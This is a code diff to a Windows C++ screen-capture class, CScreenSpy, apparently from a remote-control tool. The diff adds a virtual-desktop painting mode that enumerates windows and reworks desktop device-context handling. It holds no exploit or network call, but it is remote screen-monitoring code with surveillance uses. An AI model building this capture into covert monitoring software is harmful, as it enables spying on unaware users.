@@ -11,10 +11,10 @@
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CScreenSpy::CScreenSpy(ULONG ulbiBitCount, BYTE algo, int gop) : ScreenCapture(algo)
+CScreenSpy::CScreenSpy(ULONG ulbiBitCount, BYTE algo, BOOL vDesk, int gop) : 
+	ScreenCapture(ulbiBitCount, algo)
 {
 	m_GOP = gop;
-	int m_ulbiBitCount = (ulbiBitCount == 16 || ulbiBitCount == 32) ? ulbiBitCount : 16;
 
 	m_BitmapInfor_Full = new BITMAPINFO();
 	memset(m_BitmapInfor_Full, 0, sizeof(BITMAPINFO));
@@ -28,22 +28,23 @@ CScreenSpy::CScreenSpy(ULONG ulbiBitCount, BYTE algo, int gop) : ScreenCapture(a
 	BitmapInforHeader->biSizeImage =
 		((BitmapInforHeader->biWidth * BitmapInforHeader->biBitCount + 31) / 32) * 4 * BitmapInforHeader->biHeight;
 
-	m_hDeskTopWnd = GetDesktopWindow();
-	m_hFullDC = GetDC(m_hDeskTopWnd);
+	m_hDeskTopDC = GetDC(NULL);
 
 	m_BitmapData_Full = NULL;
-	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);
-	m_BitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
+	m_hFullMemDC = CreateCompatibleDC(m_hDeskTopDC);
+	m_BitmapHandle	= ::CreateDIBSection(m_hDeskTopDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
 	::SelectObject(m_hFullMemDC, m_BitmapHandle);
 	m_FirstBuffer = (LPBYTE)m_BitmapData_Full;
 
 	m_DiffBitmapData_Full = NULL;
-	m_hDiffMemDC	= CreateCompatibleDC(m_hFullDC); 
-	m_DiffBitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
+	m_hDiffMemDC	= CreateCompatibleDC(m_hDeskTopDC); 
+	m_DiffBitmapHandle	= ::CreateDIBSection(m_hDeskTopDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
 	::SelectObject(m_hDiffMemDC, m_DiffBitmapHandle);
 
-	m_RectBufferOffset = 0;
-	m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2];
+	m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2 + 12];
+
+	m_bVirtualPaint = vDesk;
+	m_data.Create(m_hDeskTopDC, m_iScreenX, m_iScreenY, m_ulFullWidth, m_ulFullHeight);
 }
 
 
@@ -55,7 +56,7 @@ CScreenSpy::~CScreenSpy()
 		m_BitmapInfor_Full = NULL;
 	}
 
-	ReleaseDC(m_hDeskTopWnd, m_hFullDC);
+	ReleaseDC(NULL, m_hDeskTopDC);
 
 	if (m_hFullMemDC!=NULL)
 	{
@@ -86,15 +87,11 @@ CScreenSpy::~CScreenSpy()
 		delete[] m_RectBuffer;
 		m_RectBuffer = NULL;
 	}
-
-	m_RectBufferOffset = 0;
 }
 
 LPBYTE CScreenSpy::GetFirstScreenData(ULONG* ulFirstScreenLength)
 {
-	//用于从原设备中复制位图到目标设备
-	::BitBlt(m_hFullMemDC, 0, 0, m_ulFullWidth, m_ulFullHeight, m_hFullDC, 0, 0, SRCCOPY);
-
+	ScanScreen(m_hFullMemDC, m_hDeskTopDC, m_ulFullWidth, m_ulFullHeight);
 	m_RectBuffer[0] = TOKEN_FIRSTSCREEN;
 	memcpy(1 + m_RectBuffer, m_BitmapData_Full, m_BitmapInfor_Full->bmiHeader.biSizeImage);
 	if (m_bAlgorithm == ALGORITHM_GRAY) {
@@ -108,6 +105,13 @@ LPBYTE CScreenSpy::GetFirstScreenData(ULONG* ulFirstScreenLength)
 
 VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
 {
+	if (m_bVirtualPaint){
+		int n = 0;
+		if (n = EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&m_data.SetScreenDC(hdcDest))) {
+			Mprintf("EnumWindowsTopToDown failed: %d!!!\n", n);
+		}
+		return;
+	}
 	AUTO_TICK(70);
 #if COPY_ALL
 	BitBlt(hdcDest, 0, 0, ulWidth, ulHeight, hdcSour, 0, 0, SRCCOPY);
